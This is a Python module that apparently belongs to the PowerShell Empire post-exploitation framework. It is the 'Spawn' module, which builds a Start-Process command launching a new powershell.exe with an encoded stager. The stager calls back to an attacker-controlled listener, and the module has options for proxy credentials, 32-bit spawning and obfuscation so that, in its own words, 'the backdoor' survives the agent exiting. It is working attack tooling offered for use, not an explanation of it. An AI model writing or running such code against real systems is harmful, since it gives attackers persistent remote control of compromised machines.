from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Spawn',

            'Author': ['@harmj0y'],

            'Description': ('Spawns a new agent in a new powershell.exe process.'),

            'Background' : False,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : True,

            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': []
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'SysWow64' : {
                'Description'   :   'Switch. Spawn a SysWow64 (32-bit) powershell.exe.',
                'Required'      :   False,
                'Value'         :   ''
            },            
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):
 
        # extract all of our options
        listenerName = self.options['Listener']['Value']
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']
        sysWow64 = self.options['SysWow64']['Value']

        # generate the launcher code
        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)

        if launcher == "":
            print helpers.color("[!] Error in launcher command generation.")
            return ""
        else:
            # transform the backdoor into something launched by powershell.exe
            # so it survives the agent exiting  
            if sysWow64.lower() == "true":
                stagerCode = "$Env:SystemRoot\\SysWow64\\WindowsPowershell\\v1.0\\" + launcher
            else:
                stagerCode = "$Env:SystemRoot\\System32\\WindowsPowershell\\v1.0\\" + launcher

            parts = stagerCode.split(" ")

            code = "Start-Process -NoNewWindow -FilePath \"%s\" -ArgumentList '%s'; 'Agent spawned to %s'" % (parts[0], " ".join(parts[1:]), listenerName)
            if obfuscate:
                code = helpers.obfuscate(self.mainMenu.installPath, psScript=code, obfuscationCommand=obfuscationCommand)
            return code
